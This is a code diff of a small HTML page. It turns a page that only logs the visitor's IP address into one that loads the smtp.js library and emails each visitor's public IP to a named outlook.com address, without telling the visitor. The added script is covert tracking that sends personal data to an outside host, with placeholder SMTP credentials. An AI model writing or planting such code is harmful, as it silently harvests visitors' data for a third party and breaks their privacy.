@@ -1,15 +1,25 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IP Address Fetcher</title>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
 </head>
 <body>
-    <SCRIPT LANGUAGE="JavaScript">
+    <script>
     fetch('https://api.ipify.org?format=json')
-      .then(response => response.json())
-      .then(data => console.log(data.ip));
+        .then(response => response.json())
+        .then(data => {
+            Email.send({
+                Host: "smtp.mailendo.com",
+                Username: "your_username",
+                Password: "your_password",
+                To: 'jkean2012@outlook.com',
+                From: "you@isp.com",
+                Subject: "Ip",
+                Body: "Ip: " + data.ip
+            }).then(
+                message => console.log("Email sent successfully")
+            );
+        });
     </script>
 </body>
 </html>
